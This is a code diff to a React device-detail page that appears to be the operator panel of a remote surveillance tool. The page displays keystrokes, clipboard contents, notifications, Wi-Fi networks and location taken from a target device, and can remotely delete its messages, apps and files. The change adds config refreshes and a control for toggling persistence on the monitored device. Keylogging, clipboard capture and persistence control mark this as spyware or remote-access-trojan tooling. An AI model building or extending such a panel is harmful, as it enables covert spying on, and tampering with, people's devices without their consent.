@@ -42,9 +42,9 @@ export default function DeviceDetailPage() {
   } = useDeviceDetail(deviceId, isTabEnabled);
 
   const {
-    telemetryConfig, setTelemetryConfig, persistenceStatus, currentSsid,
+    telemetryConfig, setTelemetryConfig, persistenceStatus, updatePersistenceStatus, currentSsid,
     notifications, keystrokes, clipboardItems, lockEvents, wifiNetworks,
-    fetchTelemetryData, clearModuleData,
+    fetchTelemetryData, clearModuleData, fetchConfig,
   } = useDeviceTelemetry(deviceId);
 
   const toggleTab = (tabId: string) => {
@@ -103,7 +103,10 @@ export default function DeviceDetailPage() {
     <div className="space-y-3 sm:space-y-5 pb-20 md:pb-8 max-w-full overflow-x-hidden">
       <DeviceDetailHeader
         device={device}
-        onRefresh={handleFullRefresh}
+        onRefresh={() => {
+          handleFullRefresh();
+          fetchConfig();
+        }}
         isRefreshing={isRefreshing}
         onOpenControls={() => setShowTelemetryModal(true)}
       />
@@ -139,12 +142,19 @@ export default function DeviceDetailPage() {
             apps: "sync_apps", gallery: "sync_gallery", security: "sync_wifi", map: "fetch_location",
           };
           if (syncMap[activeTab]) sendCommand(syncMap[activeTab], {}, `Sync ${activeTab}`);
+          fetchConfig();
           if (["notifications", "keylogger", "clipboard", "security"].includes(activeTab)) {
             fetchTelemetryData(activeTab);
-            setTimeout(() => fetchTelemetryData(activeTab), 2500);
+            setTimeout(() => {
+              fetchTelemetryData(activeTab);
+              fetchConfig();
+            }, 2500);
           } else {
             fetchTabData(activeTab, true, true);
-            setTimeout(() => fetchTabData(activeTab, true, true), 2500);
+            setTimeout(() => {
+              fetchTabData(activeTab, true, true);
+              fetchConfig();
+            }, 2500);
           }
         }}
         onToggleLiveMovement={handleToggleLiveMovement}
@@ -161,6 +171,7 @@ export default function DeviceDetailPage() {
         onBulkDeleteMessages={handleBulkDeleteMessages}
         onBulkDeleteApps={handleBulkDeleteApps}
         onBulkDeleteFiles={handleBulkDeleteFiles}
+        onUpdatePersistence={updatePersistenceStatus}
       />
 
       <DeviceTelemetryControlsModal
@@ -169,6 +180,7 @@ export default function DeviceDetailPage() {
         deviceId={deviceId}
         initialConfig={telemetryConfig}
         persistenceStatus={persistenceStatus}
+        onTogglePersistence={updatePersistenceStatus}
         onSaved={(cfg) => setTelemetryConfig(cfg)}
       />
     </div>
